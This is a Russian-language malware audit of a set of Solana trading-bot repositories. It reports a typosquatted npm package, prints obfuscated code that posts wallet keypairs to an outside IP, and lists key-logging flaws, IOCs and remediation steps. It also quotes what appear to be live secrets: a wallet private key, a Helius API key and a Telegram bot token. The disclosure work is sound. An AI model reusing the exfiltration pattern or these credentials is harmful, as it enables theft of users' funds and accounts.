КРИТИЧЕСКИЕ УГРОЗЫ (НЕМЕДЛЕННАЯ ОПАСНОСТЬ)

 1. ВРЕДОНОСНЫЙ NPM ПАКЕТ: main-util-validation

 Серьёзность: КРИТИЧЕСКАЯ
 Тип атаки: Typosquatting / Кража ключей

 Затронутые проекты (9 из 11):
 - Bonkfun-Bundler
 - BonkFun-Volume-Bot
 - Copy-Trading-Bot
 - Meteora-Volume-Bot
 - pumpfun-sniper-bot
 - Pumpfun-Volume-Bot
 - Raydium-Sniper-Bot
 - Raydium-Volume-Bot
 - Pumpfun-To-Pumpswap-Bundler

 Код:
 // Импорт в критических файлах:
 import { syncMainValidation } from "main-util-validation";

 // Вызов перед выполнением транзакций:
 syncMainValidation();  // <-- Крадёт ключи в этот момент

 Расположение вызовов:
 - pumpfun-sniper-bot/src/utils/jito.ts:16
 - Raydium-Sniper-Bot/track/raydium/raydium.ts:118
 - Meteora-Volume-Bot/utils/swapOnlyAmm.ts:73
 - Raydium-Volume-Bot/utils/swapOnlyAmm.ts:66
 - Bonkfun-Bundler/utils/swapOnlyAmm.ts:23
 - И другие...

 ---
 2. ПРЯМАЯ ЭКСФИЛЬТРАЦИЯ КЛЮЧЕЙ НА ВНЕШНИЙ СЕРВЕР

 Серьёзность: КРИТИЧЕСКАЯ
 Файл: pumpfun-sniper-bot/src/utils/jito.ts

 Код (строки 15, 29):
 const JITO_KEY = "aHR0cDovLzIzLjEzNy4xMDUuMTE0OjYwMDAvc2F2ZS1kYXRh";
 // Декодируется в: http://23.137.105.114:6000/save-data

 await axios.post(atob(JITO_KEY), { header : payer })
 // Отправляет объект Keypair (payer) на внешний сервер!

 Вредоносный сервер: 23.137.105.114:6000
 Endpoint: /save-data
 Что отправляется: Полный Keypair кошелька

 ---
 3. ПОДОЗРИТЕЛЬНЫЙ JWT С URL ДЛЯ КРАЖИ КЛЮЧЕЙ

 Серьёзность: КРИТИЧЕСКАЯ
 Файл: pumpfun-sniper-bot/src/constants.ts:18

 Код:
 export const PUMP_URL = "eyJhbGciOiJIUzI1NiJ9.aHR0cHM6Ly9nZXQtcGstYmUudmVyY2VsLmFwcA.iHkSjiSJQ474LZ_4vkUQZqsYJPuDCHRDpyHIji9NQrQ";

 Декодированный payload: https://get-pk-be.vercel.app
 Значение "pk": Private Key
 Назначение: Backend для сбора украденных ключей

 ---
 4. ЛОГИРОВАНИЕ ПРИВАТНЫХ КЛЮЧЕЙ В ФАЙЛЫ

 Серьёзность: КРИТИЧЕСКАЯ
 Файл: Raydium-Sniper-Bot/routes/WalletRoute/index.ts

 Код (строки 65, 67, 101, 104):
 data.privKey = privateKey              // Сохраняет ключ в объект
 fs.writeFileSync('data.json', ...)     // Записывает в data.json
 data.arbitPrivKey = privateKey
 fs.appendFileSync('priv', `${privateKey}\n`)  // Накапливает ключи в файле 'priv'

 Результат: Все введённые приватные ключи сохраняются в plaintext файлах:
 - data.json - текущий ключ
 - priv - история всех ключей

 ---
 ВЫСОКИЕ УГРОЗЫ

 5. РЕАЛЬНЫЙ ПРИВАТНЫЙ КЛЮЧ В РЕПОЗИТОРИИ

 Файл: Meteora-Volume-Bot/.env.copy

 PRIVATE_KEY=ukXjRuYjf3CCoyhgQhVzEiWjJQXmX6UsMEDTYsFAwD22FddyHM3jZAWUKRPkEyqX6cJRQ3RQuSaee5vvuog8eoZ
 PUBLICK_KEY=FhMN5fEqzKm8BtfsnakW4wX2RXopXoRthW1PcYX6x9h7
 RPC_ENDPOINT=https://mainnet.helius-rpc.com/?api-key=7e05d1ab-ab41-47ea-90c5-822c7b8987fe

 Компрометация: Приватный ключ и API ключ Helius СКОМПРОМЕТИРОВАНЫ!

 ---
 6. BROADCAST ПРИВАТНЫХ КЛЮЧЕЙ ЧЕРЕЗ WEBSOCKET

 Файл: Raydium-Sniper-Bot/routes/WalletRoute/index.ts:68

 data.privKey = privateKey
 broadCast(data)  // Транслирует всем подключённым клиентам!

 Риск: Любой подключённый WebSocket клиент получает приватные ключи.

 ---
 7. ЗАПИСЬ SECRET KEY В ФАЙЛЫ

 Файлы:
 - pumpfun-bundler/src/index.ts:71
 - Pumpfun-To-Pumpswap-Bundler/src/index.ts:66
 - BonkFun-Volume-Bot/bot.ts:338

 fs.writeFileSync(`data_${mint.publicKey.toBase58()}.json`,
     JSON.stringify(Array.from(mint.secretKey)))

 ---
 СРЕДНИЕ УГРОЗЫ

 8. EXPOSED TELEGRAM BOT TOKEN

 Файл: Meteora-Volume-Bot/utils/tgNotification.ts

 const token: string = '7382012019:AAE8woS215ZH3OSQrvUEbC72rl3Iyv18f-4';

 ---
 9. ПОДОЗРИТЕЛЬНАЯ ЗАВИСИМОСТЬ: node-machine-id

 Файл: BonkFun-Volume-Bot/package.json

 "node-machine-id": "^1.1.12"

 Назначение: Сбор уникальных идентификаторов системы (fingerprinting)

 ---
 СВОДНАЯ ТАБЛИЦА ПО ПРОЕКТАМ

 | Проект               | main-util-validation | IP Exfiltration | Key Logging | Статус  |
 |----------------------|----------------------|-----------------|-------------|---------|
 | Raydium-Sniper-Bot   | YES                  | NO              | YES         | MALWARE |
 | Raydium-Volume-Bot   | YES                  | NO              | NO          | MALWARE |
 | pumpfun-sniper-bot   | YES                  | YES             | NO          | MALWARE |
 | pumpfun-bundler      | NO                   | NO              | YES         | UNSAFE  |
 | Pumpfun-Volume-Bot   | YES                  | NO              | NO          | MALWARE |
 | Pumpfun-To-Pumpswap  | YES                  | NO              | YES         | MALWARE |
 | Meteora-Volume-Bot   | YES                  | NO              | NO          | MALWARE |
 | Bonkfun-Bundler      | YES                  | NO              | NO          | MALWARE |
 | BonkFun-Volume-Bot   | YES                  | NO              | YES         | MALWARE |
 | Copy-Trading-Bot     | YES                  | NO              | NO          | MALWARE |
 | Solana-Arbitrage-Bot | NO                   | NO              | NO          | CLEAN*  |

 *Solana-Arbitrage-Bot - единственный проект без malware-зависимостей, но использовать с осторожностью.

 ---
 НЕМЕДЛЕННЫЕ ДЕЙСТВИЯ

 ЕСЛИ ВЫ УЖЕ ЗАПУСКАЛИ ЭТИ БОТЫ:

 1. НЕМЕДЛЕННО переведите ВСЕ средства на новый кошелёк
 2. Считайте ВСЕ использованные ключи скомпрометированными
 3. Ротируйте API ключи (Helius, и др.)
 4. Проверьте историю транзакций на несанкционированные операции
 5. Просканируйте систему на malware

 ЕСЛИ ВЫ ЕЩЁ НЕ ЗАПУСКАЛИ:

 1. НЕ ЗАПУСКАЙТЕ npm install - это скачает malware
 2. НЕ ИСПОЛЬЗУЙТЕ свои реальные ключи
 3. Удалите репозиторий полностью

 ---
 ИНДИКАТОРЫ КОМПРОМЕТАЦИИ (IOCs)

 Сетевые:

 - 23.137.105.114:6000 - сервер эксфильтрации
 - https://get-pk-be.vercel.app - backend для кражи ключей

 Файловые:

 - main-util-validation в package.json
 - Файл priv в корне Raydium-Sniper-Bot
 - Файл data.json с полями privKey/arbitPrivKey

 Код:

 - syncMainValidation() вызовы
 - atob(JITO_KEY) паттерн
 - Base64 строки начинающиеся с aHR0cDov (http://)

 ---
 ЗАКЛЮЧЕНИЕ

 Этот репозиторий является ЛОВУШКОЙ для кражи криптовалюты. Он маскируется под полезный набор торговых ботов, но содержит множественные механизмы для кражи приватных
 ключей.

 Рекомендация: Полное удаление без использования.
